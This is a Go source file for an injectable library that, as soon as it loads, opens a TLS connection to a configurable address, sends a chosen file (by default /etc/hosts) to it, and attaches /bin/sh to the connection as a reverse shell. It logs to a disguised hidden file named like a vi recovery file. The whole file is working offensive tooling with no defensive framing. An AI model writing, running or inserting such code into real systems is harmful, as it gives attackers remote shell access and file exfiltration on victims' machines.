// Program injecty_lib - injectable shello_world with TLS and a baked-in config
package main

/*
 * injecty_lib.go
 * shello_world, but TLS and a baked-in config
 * By J. Stuart McMurray
 * Created 20240908
 * Last Modified 20240908
 */

import (
	"context"
	"crypto/tls"
	"log"
	"os"
	"os/exec"
	"strconv"
)

// Compile-time configurables
var (
	Address = "localhost:4444"
	File    = "/etc/hosts"
	Log     = "/tmp/.vi_recover"
)

// Context to let main know when shell is finished.
var ctx, cancel = context.WithCancel(context.Background())

// If we're injected, call back with a shell in a new goroutine.
func init() {
	go shell()
}

// If we're running as a standalone program, init will spawn a goroutine for
// our shell.  We'll wait until it's done before we end the program.
func main() { <-ctx.Done() }

// shell hooks up /bin/sh to a TLS connection to Address.
func shell() {
	/* Let main know when we're finished. */
	defer cancel()

	/* Set up logging. */
	lf, err := os.OpenFile(Log, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0600)
	if nil != err { /* Not much we can do here :( */
		return
	}
	defer lf.Close()
	l := log.New(lf, "["+strconv.Itoa(os.Getpid())+"] ", log.LstdFlags)

	/* Connect to the server. */
	c, err := tls.Dial("tcp", Address, nil)
	if nil != err {
		l.Printf("Error connecting to server: %s", err)
		return
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		l.Printf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		l.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		l.Printf("Shell died: %s", err)
	}
}
